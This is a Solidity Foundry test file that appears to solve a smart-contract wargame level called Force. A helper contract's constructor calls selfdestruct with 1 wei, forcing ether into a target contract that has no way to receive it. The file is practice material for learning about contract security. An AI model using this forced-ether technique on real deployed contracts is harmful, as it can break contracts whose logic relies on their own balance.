// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "../src/Force.sol";
import {Test, console} from "forge-std/Test.sol";

/**
 * @title ForceSolution
 * @author Shibi Kishore
 * @notice Written this test similar to script as we can test the selfdestruct and contract balance for this task
 */
contract ToReceviveTheBalance {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceSolution is Test {
    Force public force;
    address public USER = makeAddr("user");

    function setUp() public payable {
        force = new Force();
        new ToReceviveTheBalance{value: 1 wei}(payable(address(force)));
    }
}
